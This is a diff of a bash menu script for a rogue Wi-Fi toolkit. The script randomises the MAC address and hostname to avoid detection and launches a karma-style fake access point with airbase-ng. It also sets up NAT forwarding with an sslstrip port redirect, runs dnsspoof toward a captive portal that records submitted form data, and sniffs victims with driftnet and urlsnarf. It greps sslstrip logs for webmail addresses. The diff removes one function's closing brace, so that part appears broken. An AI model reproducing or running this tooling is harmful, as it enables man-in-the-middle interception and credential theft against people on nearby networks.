@@ -27,6 +27,7 @@ echo "8. Perform tails sslstrip "
 echo "9. Perform tails Captive Portal "
 echo
 read -p "Choice: " interfacechoice
+
 echo
 
   case $interfacechoice in
@@ -41,60 +42,52 @@ echo
 	9) f_captive ;;
   esac
 }
-echo
-echo
 
+echo
 
 #evilap
 clear
 echo
 f_evilap(){
 	
-echo -e "\e[35mRolling MAC address and Hostname randomly to make you more difficult to find\e[0m"
-ifconfig wlan1 down
-macchanger -r wlan1
-echo
-echo -e "\e[35mYour new local mac adress:\e[0m"
-hn=`ifconfig wlan1 |grep HWaddr |awk '{print$5}' |awk -F":" '{print$1$2$3$4$5$6}'`
+echo -e "\e[35mChange your mac adress on at0\e[0m"
+ifconfig at0 down
+macchanger -r at0
+
+echo -e "\e[35mYour new local mac adress on at0:\e[0m"
+hn=`ifconfig at0 |grep HWaddr |awk '{print$5}' |awk -F":" '{print$1$2$3$4$5$6}'`
 hostname $hn
 echo $hn
-echo
-echo -e " \e[44mLet's GO\e[0m"
-echo -e "\e[31mStop previous wlan1mon\e[0m"
+
 airmon-ng stop wlan1mon
-
-#put wlan1 into monitor mode - wlan1mon created
-echo -e "\e[31mcreating the new wlan1mon from wlan1\e[0m"
-echo
+sleep 2s
+#turn wlan1 into monitor mod
 airmon-ng start wlan1
-echo -e "\e[92mIt's Ok\e[0m"
 clear
-
 
 #airbase-ng
-echo -e "\e[96mCreating the AP in bad karma\e[0m"
+echo -e "\e[96mYour fake AP will respond to all probe request around you\e[0m"
+echo "----------------------------------------"
+echo -e "\e[93mChose the fakeAP channel [1-13]\e[0m"
+echo -e "\e[93mChose the fakeAP name\e[0m"
 echo
-echo -e "\e[93mTarget the channel of the wifi-router [1-13]\e[0m"
-echo -e "\e[93mTarget the name of the wifi-router\e[0m"
-echo
-read -p "Enter the Wi-Fi [1-13] : " channel
-read -p "Enter the Wi-Fi [ESSID] : " essid
+read -p "Enter the fakeAP channel [1-13] : " channel
+read -p "Enter the fakeAP name [ESSID] : " essid
 clear
 echo
-echo -e "\e[34mscreen session named : karma is running now\e[0m"
-echo -e "\e[34mcommand : screen -x karma to catch the screen\e[0m"
+echo -e "\e[96mGNU screen session created --> karma\e[0m"
+echo -e "\e[96mscreen -x karma to enter into the screen session\e[0m"
 sleep 5s
 screen -dmS karma airbase-ng -P -C 60 -y -e $essid -c $channel -v wlan1mon 
 }
 
-
+#option acces-point soft
 f_accespoint-soft(){
 #cleanning iptable
 iptables --flush
 iptables --table nat --flush
 iptables --delete-chain
 iptables --table nat --delete-chain
-
 
 #start to set rules on iptable based on the dhcpd.conf
 ifconfig at0 up
@@ -103,21 +96,18 @@ route add -net 192.168.7.0 netmask 255.255.255.0 gw 192.168.7.1
 pkill dhcpd
 /etc/init.d/isc-dhcp-server start
 
-
 #active router mod and configure some iptable
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
 iptables --append FORWARD --in-interface at0 -j ACCEPT
 }
-
-
+#option acces-point ssl
 f_accespoint-ssl (){
 #cleanning iptable
 iptables --flush
 iptables --table nat --flush
 iptables --delete-chain
 iptables --table nat --delete-chain
-
 
 #start to set rules on iptables based on the dhcpd.conf
 ifconfig at0 up
@@ -126,13 +116,11 @@ route add -net 192.168.7.0 netmask 255.255.255.0 gw 192.168.7.1
 pkill dhcpd
 /etc/init.d/isc-dhcp-server start
 
-
 #iptable rules for ssltrip to 8888 port listener
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
 iptables --append FORWARD --in-interface at0 -j ACCEPT
 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
-
 
 #launch ssltrip with log
 echo
@@ -140,9 +128,8 @@ echo -e "\e[34mLogs saved to /sdcard/capture/ssl/\e[0m"
 logfile=/sdcard/capture/ssl/sslstrip_$(date +%F-%H%M).log
 echo
 echo -e "\e[35m*When you have finish the sslstrip (ctrl-C to escape)\e[0m"
-}
 
-
+#option acces-point captive portal
 f_accespoint-dnspoof-captive(){
 #cleanning iptable
 iptables --flush
@@ -150,18 +137,15 @@ iptables --table nat --flush
 iptables --delete-chain
 iptables --table nat --delete-chain
 
-
 #start to set rules on iptables based on the dhcpd.conf
 ifconfig at0 up
 ifconfig at0 192.168.7.1 netmask 255.255.255.0
 route add -net 192.168.7.0 netmask 255.255.255.0 gw 192.168.7.1
 
-
 #iptable rules
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
 iptables --append FORWARD --in-interface at0 -j ACCEPT
-
 
 #put the wlan0 ip
 echo -e "\e[34myour ip\e[0m"
@@ -177,15 +161,12 @@ echo -e "\e[31mDHCP-server start\e[0m"
 sleep 2s
 service apache2 restart
 sleep 1s
-echo -e "\e[31mDNS SPOOF!\e[0m"
-echo -e "\e[34mlogs saved to /sdcard/capture/dnspoof/\e[0m"
-echo
-echo -e "\e[34mscreen session named : dnsspoof is running now\e[0m"
-echo -e "\e[34mcommand : screen -x dnsspoof to catch the screen\e[0m"
+echo -e "\e[31mdnsspoof launched\e[0m"
+echo -e "\e[96mGNU screen session created --> dnsspoof e[0m"
+echo -e "\e[96mscreen -x dnsspoof to enter into the screen\e[0m"
 sleep 5s
 screen -dmS dnsspoof dnsspoof -i at0 -f /usr/local/hosts
 }
-
 
 #driftnet
 clear
@@ -196,7 +177,6 @@ f_driftnet(){
    driftnet -v -i at0
 }
 
-
 #urlsnarf
 clear
 echo
@@ -206,7 +186,6 @@ f_urlsnarf(){
    urlsnarf -i at0 >> /sdcard/capture/urlsnarf/urlsnarf_$(date +%F-%H%M).log
 }
 
-
 #tail captive portal
 echo
 f_captive(){
@@ -214,7 +193,6 @@ clear
 echo -e " \e[44mCaptive Portal Tail\e[0m"
 tail -f /var/www/"$wwwdir"/"formdata.txt"
 }
-
 
 #tail dhcp lease
 echo
@@ -227,9 +205,7 @@ echo > /var/lib/dhcp/dhcpd.leases
 cat /dev/null > /tmp/dhcpd.conf
 sleep 1s
 tail -f /var/lib/dhcp/dhcpd.leases 2> /dev/null | grep --color -E "lease|hardware|client"
-
 }
-
 
 #tail ssltrip log
 echo
@@ -239,7 +215,6 @@ echo -e " \e[44mSSL Tail filtering mail extension\e[0m"
 echo
 tail -f /opt/maelstrom/ssllog.txt | grep -E 'orange.fr|gmail.com|free.fr|hotmail.fr|hotmail.com'
 }
-
 
 #run interface
 f_run(){
